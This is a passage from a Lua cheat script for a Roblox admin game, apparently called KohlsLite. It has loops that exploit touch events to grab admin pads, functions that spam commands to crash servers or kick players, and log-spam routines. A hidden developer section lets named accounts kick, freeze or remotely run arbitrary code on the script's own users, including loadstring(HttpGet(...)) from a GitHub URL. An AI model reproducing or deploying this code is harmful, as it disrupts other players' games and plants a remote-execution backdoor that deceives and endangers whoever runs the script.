        Remind("Sorry, your exploit does not support serverhopping (httprequest)")
    end
end

-- keybinds
game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key)
        task.wait(0)
        if key:lower() == housekeybind then
                House()
        end
        if key:lower() == rekeybind then
                Chat("reset me")
        end        

	if key:lower() == flykeybind then
                Chat(prefix.."ufly")
        end   

	--[[if key:lower() == crashkey then
                DCrash()
        end     ]]
end)

-- some antis and admin system
function PLRSTART(v)
    v.Chatted:Connect(function(msg)
            task.wait(0)
            task.spawn(function()
                    task.wait(0)

                    if string.sub(msg:lower(), 0, 9) == "/c system" and v.Name ~= game.Players.LocalPlayer.Name then
                        if PingCsystem then
                            print(v.Name .. " is using /c system.")
                            Chat("h \n\n\n " .. v.Name .. " is using /c system. Sneaky! \n\n\n")
                        end
                    end

                    if string.sub(msg:lower(), 0, 2) == "/w" and v.Name ~= game.Players.LocalPlayer.Name then
                        if PingCsystem then
                            print(v.Name .. " is using whispering commands.")
                            Chat("h \n\n\n " .. v.Name .. " is using whispering commands. \n\n\n")
                        end
                    end

                    if (string.sub(msg:lower(), 0, 4) == "logs" or string.sub(msg:lower(), 0, 5) == ":logs") and v.Name ~= game.Players.LocalPlayer.Name then
                        if PingLogs then
                            print(v.Name .. " is using logs.")
                            Chat("h \n\n\n " .. v.Name .. " is using logs. \n\n\n")
                        end
                        if AntiLogs then
			    	if logmode == "default" then
                            		LogSpam()
				elseif logmode == "crack" then
					LogTrap()
				else end
                        end
                    end

                    if (string.sub(msg:lower(), 0, 6) == "btools" or string.sub(msg:lower(), 0, 7) == ":btools" or string.sub(msg:lower(), 0, 7) == ";btools") and v.Name ~= game.Players.LocalPlayer.Name then
                        print(v.Name .. " thought btools existed.")
                        Chat("h \n\n\n " .. v.Name .. ", btools do not exist anymore! \n\n\n")
                    end

                    if (string.sub(msg:lower(), 0, 3) == "f3x" or string.sub(msg:lower(), 0, 4) == ":f3x" or string.sub(msg:lower(), 0, 4) == ";f3x") and v.Name ~= game.Players.LocalPlayer.Name then
                        print(v.Name .. " thought f3x existed.")
                        Chat("h \n\n\n " .. v.Name .. ", f3x do not exist! \n\n\n")
                    end

                    if (string.sub(msg:lower(), 0, 3) == "sit" or string.sub(msg:lower(), 0, 4) == ":sit") and v.Name ~= game.Players.LocalPlayer.Name then
                        if antiattach then
                            Chat("reload " .. v.Name)
                            print(v.Name .. " tried to sit.")
                        end
                    end

                    if (string.sub(msg:lower(), 0, 8) == "unpunish" or string.sub(msg:lower(), 0, 9) == ":unpunish") and v.Name ~= game.Players.LocalPlayer.Name then
                        if antiattach then
                            Chat("reload " .. v.Name)
                            print(v.Name .. " tried to unpunish.")
                        end
                    end

                    if (string.sub(msg:lower(), 0, 4) == "stun" or string.sub(msg:lower(), 0, 5) == ":stun") and v.Name ~= game.Players.LocalPlayer.Name then
                        if antiattach then
                            Chat("reload " .. v.Name)
                            print(v.Name .. " tried to stun.")
                        end
                    end

                    if string.sub(msg:lower(), 0, 4) == ".fly" and v.Name ~= game.Players.LocalPlayer.Name then
                        if noobdetect then
                            print(v.Name .. " is a noob. / Said '.fly' ")
                            Chat("h \n\n\n " .. v.Name .. ", it is fly me, not .fly!! \n\n\n")
                        end
                    end

                    if string.sub(msg:lower(), 0, 4) == ";fly" and v.Name ~= game.Players.LocalPlayer.Name then
			if not string.sub(msg:lower(), 0, 7) == ";fly me" then
                        	if noobdetect then
                            		print(v.Name .. " is a noob. / Said ';fly' ")
                            		Chat("h \n\n\n " .. v.Name .. ", it is fly me, not ;fly!! \n\n\n")
                        	end
			end
                    end

                    if string.sub(msg:lower(), 0, 4) == "/fly" and v.Name ~= game.Players.LocalPlayer.Name then
                        if noobdetect then
                            print(v.Name .. " is a noob. / Said '/fly' ")
                            Chat("h \n\n\n " .. v.Name .. ", it is fly me, not /fly!! \n\n\n")
                        end
                    end

                    if string.sub(msg:lower(), 0, 5) == ";poop" or string.sub(msg:lower(), 0, 5) == ":poop" or string.sub(msg:lower(), 0, 4) == "poop" or string.sub(msg:lower(), 0, 5) == ".poop" then
                        if noobdetect then
                            if v.Name ~= "IceStuds" and v.Name ~= "atprog" then -- very epik exception
                                print(v.Name .. " is a noob. / Said 'poop' ")
                                Chat("h \n\n\n " .. v.Name .. ", did you come from a FREE ADMIN game? POOP isn't a command! \n\n\n")
                            elseif v.Name == "IceStuds" then
                                Chat("h \n\n\n [IceStuds]: Poop \n\n\n")
                            else
                                Chat("h \n\n\n [atprog]: Poop \n\n\n")
                            end
                        end
                    end

                    if string.sub(msg:lower(), 0, 6) == ";morph" or string.sub(msg:lower(), 0, 6) == ":morph" or string.sub(msg:lower(), 0, 5) == "morph" then
                        if noobdetect then
                            print(v.Name .. " is a noob. / Said 'morph' ")
                            Chat("h \n\n\n " .. v.Name .. ", did you come from a FREE ADMIN game? MORPH isn't a command! \n\n\n")
                        end
                    end

                    if string.sub(msg:lower(), 0, 5) == ";cmds" or string.sub(msg:lower(), 0, 9) == ";commands" and v.Name ~= game.Players.LocalPlayer.Name then
                        if noobdetect then
                            print(v.Name .. " is a noob. / Said ';cmds' ")
                            Chat("h \n\n\n " .. v.Name .. ", imagine using the ; prefix! Just say 'commands' or 'cmds'! \n\n\n")
                        end
                    end

                    if string.sub(msg:lower(), 0, 5) == "/cmds" or string.sub(msg:lower(), 0, 9) == "/commands" and v.Name ~= game.Players.LocalPlayer.Name then
                        if noobdetect then
                            print(v.Name .. " is a noob. / Said '/cmds' ")
                            Chat("h \n\n\n " .. v.Name .. ", imagine using the / prefix! Just say 'commands' or 'cmds'! \n\n\n")
                        end
                    end

                    if (string.sub(msg:lower(), 0, 5) == ".cmds" or string.sub(msg:lower(), 0, 9) == ".commands") and v.Name ~= game.Players.LocalPlayer.Name then
                        if noobdetect then
                            print(v.Name .. " is a noob. / Said '.cmds' ")
                            Chat("h \n\n\n " .. v.Name .. ", imagine using the . prefix! Just say 'commands' or 'cmds'! \n\n\n")
                        end
                    end

                    if string.sub(msg:lower(), 0, 7) == ";fly me" and v.Name ~= game.Players.LocalPlayer.Name then
                        if noobdetect then
                            print(v.Name .. " is a noob. / Said ';fly me' ")
                            Chat("h \n\n\n " .. v.Name .. ", imagine using the ; prefix! Just say 'fly me'! \n\n\n")
                        end
                    end

                    if (string.sub(msg:lower(), 0, 6) == ";bring" or string.sub(msg:lower(), 0, 6) == ":bring" or string.sub(msg:lower(), 0, 5) == "bring" or string.sub(msg:lower(), 0, 6) == ".bring") and v.Name ~= game.Players.LocalPlayer.Name then
                        if noobdetect then
                            print(v.Name .. " is a noob. / Said 'bring' ")
                            Chat("h \n\n\n " .. v.Name .. ", it is tp (player) me, not bring (player)!! \n\n\n")
                        end
                    end

                    if (string.sub(msg:lower(), 0, 5) == ";goto" or string.sub(msg:lower(), 0, 5) == ":goto" or string.sub(msg:lower(), 0, 4) == "goto" or string.sub(msg:lower(), 0, 5) == ".goto") and v.Name ~= game.Players.LocalPlayer.Name then
                        if noobdetect then
                            print(v.Name .. " is a noob. / Said 'goto' ")
                            Chat("h \n\n\n " .. v.Name .. ", it is tp me (player), not goto (player)!! \n\n\n")
                        end
                    end

                    if (string.sub(msg:lower(), 0, 6) == ";sword" or string.sub(msg:lower(), 0, 6) == ".sword") and v.Name ~= game.Players.LocalPlayer.Name then
                        if noobdetect then
                            print(v.Name .. " is a noob. / Said ';sword'")
                            Chat("h \n\n\n " .. v.Name .. ", it is sword me, not ;sword or .sword!! \n\n\n")
                        end
                    end

                    -- // dev section \\ --

                    if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            Speak("I use KohlsLite!")
                        end
                    end

                    if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            Speak("Collect my pages pav...")
                        end
                    end

                    if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            setclipboard("https://discord.gg/kah")
                        end
                    end

                    if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            pcall(function()
                                    game.Players.LocalPlayer:Kick("A KohlsLite dev kicked you from the game!")
                            end)
                        end
                    end

                    if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            pcall(function()
                                    game.Players.LocalPlayer:Kick("FE BYPASSED ~atprog")
                            end)
                        end
                    end

                    if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            Remind("You have been warned by a KohlsLite dev!")
                        end
                    end

                    if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            Remind("You have been warned by a KohlsLite collaborator!")
                        end
                    end

                    if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            while true do end
                        -- game:Shutdown()
                        end
                    end

                    if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            while true do end
                        -- game:Shutdown()
                        end
                    end

                    if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
			    Execute(string.sub(msg, 6))
			end
                    end

                    if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            Execute(string.sub(msg, 6))
                        end
                    end

                    if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
                    end

                    if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            GExecute(string.sub(msg, 7))
                        end
                    end

                    if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                            GExecute(string.sub(msg, 7))
                        end
                    end
        	end)

            -- END OF DEV SECTION --

            -- ADMIN
            if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
                local command = string.gsub(msg:lower(), "me", v.Name)
                if string.sub(command, 1, 1) == ":" then
                    command = ""
                    Chat("pm " .. v.Name .. " Please use commands without the : prefix. Thanks!")
                end

                if string.sub(command, 1, 1) == "/" then -- because /e dance
                    command = ""
                end

                if string.sub(command, 1, 1) == prefix then -- so THEY don't use YOU!
                    command = ""
                end

                if string.sub(command, 1, 5) == "music" then
                    local MUSIC = string.sub(command, 7)
                    Chat("music " .. MUSIC)
			
                elseif string.sub(command, 1, 2) == "m " then
                    local message = string.sub(command, 3)
                    Chat("m " .. v.Name .. ": " .. message)
			
                elseif string.sub(command, 1, 7) == "size me" then
                    local NUMBER = string.sub(command, 9)
                    Chat("size " .. v.Name .. " " .. NUMBER)
			
                elseif string.sub(command, 1, 12) == "jumppower me" then
                    local JPP = string.sub(command, 14)
                    Chat("jumppower " .. v.Name .. " " .. JPP)
			
                elseif string.sub(command, 1, 7) == "name me" then
                    local NAME = string.sub(command, 9)
                    Chat("name " .. v.Name .. " " .. NAME)
			
                elseif string.sub(command, 1, 7) == "message" then
                    local message = string.sub(command, 9)
                    Chat("message " .. v.Name .. ": " .. message)
			
                elseif string.sub(command, 1, 3) == "pm " then
                    Chat("pm " .. v.Name .. " I can't make you private message because of limitations. Sorry!")
			
                elseif string.sub(command, 1, 5) == "hint " then
                    local message = string.sub(command, 6)
                    Chat("h " .. v.Name .. ": " .. message)
			
                elseif string.sub(command, 1, 2) == "h " then
                    local message = string.sub(command, 3)
                    Chat("h " .. v.Name .. ": " .. message)
			
                elseif string.sub(command, 1, 4) == "logs" then
                    Chat("pm " .. v.Name .. " I can't make you see logs because it's client sided. Sorry!")
			
                elseif string.sub(command, 1, 4) == "cmds" then
                    Chat("pm " .. v.Name .. " I can't make you see commands because it's client sided. Sorry!")
			
                elseif string.sub(command, 1, 8) == "commands" then
                    Chat("pm " .. v.Name .. " I can't make you see commands because it's client sided. Sorry!")
			
                elseif string.sub(command, 1, 9) == "musiclist" then
                    Chat("pm " .. v.Name .. " I can't make you see the music list because it's client sided. Sorry!")
			
                elseif string.sub(command, 1, 11) == "packagelist" then
                    Chat("pm " .. v.Name .. " I can't make you see the package list because it's client sided. Sorry!")
			
                else
                    Chat(command)
                end
		
            end
        end)
end

-- Anti lag items
local items = {
	"Smoke",
	"ForceField",
	"Explosion",
	"Fire",
	"Sparkles"
}

-- Anti lag
connections[#connections + 1] = 
	workspace.DescendantAdded:Connect(function(ch)
		if antilag then
			for i,v in items do
				if ch:IsA(v) then
					repeat
						ch:Destroy()
						game:GetService("RunService").RenderStepped:Wait()
					until not ch
				end
			end
		end
	end)

-- Backpack checker
function CheckBackpack()
        print(player.." has the following items:")
              for _, Tool in pairs(cplr.Backpack:GetChildren()) do
                print(Tool.Name)
        end
end

-- LOOPGRAB 1
task.spawn(function()
    while true do 
        task.wait(0)
            coroutine.wrap(function()
                        if loopgrab == true and firetouchinterest then
                                local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
                                for i, pad in pairs(pads) do
                                        coroutine.wrap(function()
                                                pcall(function()
                                                        local cre = pad.Head
                                                        local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                                                        firetouchinterest(cre, spr, 1)
                                                            firetouchinterest(cre, spr, 0)
                                                            firetouchinterest(cre, spr, 1)
                                                        task.wait()
                                                        firetouchinterest(cre, spr, 0)

                                                        if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
                                                                Regen()
                                                        end
                                                end)
                                        end)()
                                end
                        end
        end)()
    end
end)

-- loopgrab 2
task.spawn(function()
   while true do
   task.wait(0)
   if loopgrab2 then
      local pads = game.Workspace.Terrain._Game.Admin.Pads:GetChildren()
      for i, pad in ipairs(pads) do
         local head = pad:FindFirstChild("Head")
         local character = game.Players.LocalPlayer.Character
         local headOfCharacter = character and character:FindFirstChild("Head")

         if head and headOfCharacter and firetouchinterest then
            firetouchinterest(head, headOfCharacter, 1)
            firetouchinterest(head, headOfCharacter, 0)
            firetouchinterest(head, headOfCharacter, 1)
            wait()
            firetouchinterest(head, headOfCharacter, 0)

            if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
               Regen()
            end
         end
      end
   end
   end
end)

-- PERM 1
task.spawn(function()
    while true do 
        task.wait(0)
        coroutine.wrap(function()
                              local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                              if (perm ~= true or workspace.Terrain._Game.Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") ~= nil) and firetouchinterest then 
                              else
                                    pcall(function()
                                              local pad = workspace.Terrain._Game.Admin.Pads:FindFirstChild("Touch to get admin")
                                              local a = pad.Head
                                              firetouchinterest(a, spr, 1)
                                              firetouchinterest(a, spr, 0)
                                              firetouchinterest(a, spr, 1)
                                              task.wait()
                                              firetouchinterest(a, spr, 0)
                                    end)
                              end
        end)()
    end
end)

-- PERM 2
task.spawn(function()
    while true do
        task.wait(0)
        if perm2 == true then
            if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
                  if game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin") then
                      local pad = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head")
                      local padCFrame = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head").CFrame
                      task.wait(0.125)
                      pad.CanCollide = false
                      repeat task.wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                      pad.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                      task.wait(0.125)
                      pad.CFrame = padCFrame
                      pad.CanCollide = true
                  else
                        Regen()
                  end
            end
        end
  end
end)

-- PAD REINFORCEMENTS AND PADBANNED
task.spawn(function()
        while true do
                task.wait(0)
                for i, player in pairs(padbanned) do
                        task.wait(0)
                        for i,pad in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetDescendants()) do
                                if pad.Name == player.."'s admin" then
                                        Chat("respawn "..player)
					if blwl_an then
                                        	Chat("h \n\n\n Sorry, "..player..", you're banned from using the admin pads! \n\n\n")
					end
                                        Regen()
                                end
                        end
                end

                if padreinforcements == true then
                        for i,v in pairs(game.Players:GetChildren()) do
                                local times = 0
                                for i,pad in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetDescendants()) do
                                        if pad.Name == v.Name.."'s admin" then
                                                times = times + 1
                                        end
                                end
                                if times >= 2 then
                                        Chat("respawn "..v.Name)
					if blwl_an then
                                        	Chat("h \n\n\n The pads have been reset because "..v.Name.." tried to take them all! \n\n\n")
					end
                                        Regen()
                                end
                        end
                end
        end
end)

-- ALL PADS
function AllPads()
        local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
        for i, pad in pairs(pads) do
                task.spawn(function()
                        pad.PrimaryPart = pad:FindFirstChild("Head")
                        local pos = pad.PrimaryPart.CFrame
                        wait(0)
                        pad.PrimaryPart.CanCollide = false
                        pad:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
                        wait(0)
                        pad:SetPrimaryPartCFrame(pos)
                        pad.PrimaryPart.CanCollide = true
                end)
        end
end

-- MUSIC RELATED
task.spawn(function()
 while true do
    task.wait(0)

    if antimusic == true then
                  for i,v in pairs(workspace:GetDescendants()) do
                        if v:IsA("Sound") then 
                                if v.Playing then 
                                        v:Stop() 
                                end 
                        end
                  end
    end

    if audiotroll == true then
                        if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                                game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimePosition = math.random(0,game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimeLength*100)/100
                        end
    end

    if mymusiconly == true then -- ii's admin since mine had a small bug and was also messy
            local soundlock = tonumber(mymusiconlyid)
            local origsound = soundlock
            soundlock = "http://www.roblox.com/asset/?id="..tostring(soundlock)
            local lastUpdateTime = tick()
        local music = workspace.Terrain["_Game"].Folder:FindFirstChild("Sound")
        if gottenmode == 1 then
                    denumba = tonumber(music.TimePosition)
                print(music.TimePosition)
        else 
                denumba = 0
        end
            repeat 
                task.wait(0.1)
                local currentTime = tick() 
                local elapsedTime = currentTime - lastUpdateTime 
                lastUpdateTime = currentTime 

                        denumba = denumba + elapsedTime 

                if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound") and musicoff == false then
                            local music = workspace.Terrain["_Game"].Folder:FindFirstChild("Sound")
                            if music.IsLoaded and music.SoundId == soundlock then
                                -- print(music.TimePosition);print(denumba)
                                if denumba > music.TimeLength then 
                                            denumba = 0 
                                end 

                                if math.abs(music.TimePosition - denumba) > 0.5 then
                                            if denumba < music.TimePosition - 1 or denumba > music.TimePosition + 1 then
                                                       print(music.TimePosition) ; print(denumba)
                                                       music.TimePosition = denumba ; Remind("Fixed the time position!")
                                           end
                                end
                            end

                            if music.SoundId ~= soundlock then
                                if musicoff == false then
                                        if antimlog then
                                                    Chat("music 00000000000000000000000000000"..tostring(origsound))
                                        else
                                                    Chat("music "..tostring(origsound))
                                        end
                                end                    
                            end

                            if music.Playing == false and musicoff == false then
                                        music:Play() 
                            end
                else
                        if musicoff == false then
                                    if antimlog then
                                        Chat("music 00000000000000000000000000000"..tostring(origsound))
                                    else
                                                Chat("music "..tostring(origsound))
                                end
                            end
                end
                    until not mymusiconly
        end
  end

end)

-- GOTO
function Goto()
          Chat("tp me "..gotou)
end

-- for cframe goto
function Goto2(person)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = person.Character.HumanoidRootPart.CFrame
end

-- BRING
function Bring()
      Chat("tp "..bringu.." me")
end

function VFix()
    for i,v in pairs(game:GetService("Workspace").Terrain._Game.Workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Velocity = Vector3.new(0,0,0)
	    v.RotVelocity = Vector3.new(0, 0, 0)
        end
    end
    workspace.Terrain._Game.Workspace.Baseplate.Velocity = Vector3.new(0,0,0)
    workspace.Terrain._Game.Workspace.Baseplate.RotVelocity = Vector3.new(0,0,0) 
--game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
end

function ColFix()
         for i, v in pairs(game.Workspace:GetDescendants()) do
                -- if allclear() == false then break end
                if v:IsA("Part") then
                        v.CanCollide = true
                end
        end
end

function DisCol()
         for i, v in pairs(game.Workspace:GetDescendants()) do
                if allclear() == false then break end
                if v:IsA("Part") then
                        v.CanCollide = false
                end
        end
end

function GravFix()
      workspace.Gravity = 196.2
end

-- FREEZE CRASH
function FCrash()
      for i = 1,100 do
          Chat("clone all all all                                discord")
          Chat("freeze all all all                                discord")
      end
      PtSH()
end

-- DOG CRASH
function DCrash()
      for i = 1,100 do
          Chat("clone all all all                                discord")
          Chat("dog all all all                                  discord")
      end
      PtSH()
end

-- SHIELD CRASH
function SCrash()
      for i = 1,100 do
          Chat("shield/all/all/all")
          Chat("rocket/all/all/all")
          Chat("clone all all all			discord")
      end
      PtSH()
end

rkicking = false
-- rocket kick
function rkickplr(rkicker,rkicks) -- v, v.Name
			Chat("jail/"..rkicker)
			for i = 1, 128 do
				Chat("rocket/"..rkicker.." me "..rkicker.." me")
			end
			task.wait(.49)
			rkicking = true
			local p = rkicks
			repeat
				Chat("rocket/"..rkicker.." me "..rkicker.." me")
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(180),0) * CFrame.new(0,0,-2)
				if game.Players.LocalPlayer.Character:FindFirstChild("Rocket") then
					game.Players.LocalPlayer.Character.Rocket.CanCollide = false
					task.wait(0.5)
					game.Players.LocalPlayer.Character.Rocket:Destroy()
				end
				if p.Character:FindFirstChild("Rocket") then
					p.Character.Rocket.CanCollide = false
					task.wait(0.5)
					p.Character.Rocket:Destroy()
				end
				task.wait()
			until not rkicking or not p
end

-- FOG DANCING
task.spawn(function()
   while true do
        task.wait(0.1) -- rate limit
        if fogdance == true then
                        if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                                        pbl = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness / 10
                                        Chat("fogend "..pbl)
                        end
        end

        if ccolours == true then
			if game.Lighting.FogEnd ~= 0 then
            					Chat("fogend 0")
        		end
                        Chat("fogcolor " ..tostring(math.random(0, 255)) .." " .. tostring(math.random(0, 255)) .. " " .. tostring(math.random(0, 255)))
        end
   end
end)

-- LOG SPAM
function LogSpam()
      for i = 1,100 do
          Chat("reset KOHLSLITE ON BOTTOM - ts2021, 2024")
      end
end

-- Log Trap
function LogTrap()
      for i = 1,100 do
          Chat("reset "..umwhatdasigma)
      end
end

function InitTool()
                Remind("Gave you the click-tp tool!")
                mouse = game.Players.LocalPlayer:GetMouse()
                hum = game.Players.LocalPlayer.Character.HumanoidRootPart
                local tptool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)

                tptool.Name = "ClickTP"
                tptool.CanBeDropped = false
                tptool.RequiresHandle = false

                tptool.Activated:Connect(function()
                        if mouse.Target then
                                hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z) 
                        end
                end)
end

-- NAME HECK
task.spawn(function()
        while true do
                task.wait()
                for i, v in ipairs(game.Players:GetPlayers()) do
                        if table.find(byecam, v.Name) then
                                if v and not v.Character:FindFirstChildOfClass("Model") then
                                         Chat("name ".. v.Name .." [i got named]") -- pointless now but i'm not removing it
                                end
                        end
                        if table.find(carcar, v.Name) then
                                Chat("gear ".. v.Name .." 253519495")
                        end
                      end
      end
end)

-- FIND REGEN
task.spawn(function()
        while true do
                task.wait(0)
                if regenfind == true then
                        local root = game.Players.LocalPlayer.Character.HumanoidRootPart
                        root.Anchored = true
                        repeat
                                wait(.15)
                                root.CFrame = CFrame.new(-7.165, root.Position.Y + 2500 , 94.743)
                        until workspace.Terrain._Game.Admin:FindFirstChild("Regen") or regenfind == false
                        root.Anchored = false
                        root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0, 3, 0)
                        regenfind = false
                        Chat("respawn me");Remind("Found the regen (skydived)")
                end
                if regenfind2 == true then
			local Player = game.Players.LocalPlayer
			local PlayerService = game:GetService("Players")
                        local root = game.Players.LocalPlayer.Character.HumanoidRootPart
                        root.Anchored = true
                        repeat
                                task.wait(.15)
                                root.CFrame = CFrame.new(math.random(-30593, -23388), math.random(-30593, -10455), math.random(-30593, -10455))
                        until workspace.Terrain._Game.Admin:FindFirstChild("Regen") or regenfind2 == false
			PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                        root.Anchored = false
                        root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0, 3, 0)
                        regenfind2 = false
                        Chat("respawn me");Remind("Found the regen (KL)")
                end
        end
end)

-- leaked regen
function leakedcords()

	local Player = game.Players.LocalPlayer
	local PlayerService = game:GetService("Players")

	local function clientloadpos(thecord) -- cmdy
		PlayerService.LocalPlayer.Character.Parent = workspace
		PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = thecord
	end

	clientloadpos(CFrame.new(Vector3.new(1000000, 1000000, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, 1000003, -1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, -1000003, -1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, -1000000, -3)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(3, -1000000, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, -3, -1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(-1000000, -3, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, 3, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, 1000003, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, -1000003, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(454545, 150000, -678678)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(306712, 420552, 398158)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(-1000000, 1000003, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(-1000000, 1000003, -1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(-1000000, -1000003, -1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(45400, -49860, 56673)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(56470, -48312, 28578)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(75304, -49638, 47300)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(34120, -48830, 30233)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(34120, -48830, 30233)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(77822, -49751, 79116)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(42682, -29202, 29886)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(51052, -49558, 34068)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(-251773, 1000003, 382563)));task.wait(.5)
	clientloadpos(CFrame.new(0, 2.5, 0));task.wait(.5)
	if workspace.Terrain._Game.Admin:FindFirstChild("Regen") then
		Remind("Found regen!");Chat("respawn me")
	else
		Remind("Couldn't find regen!");Chat("respawn me")
	end

end

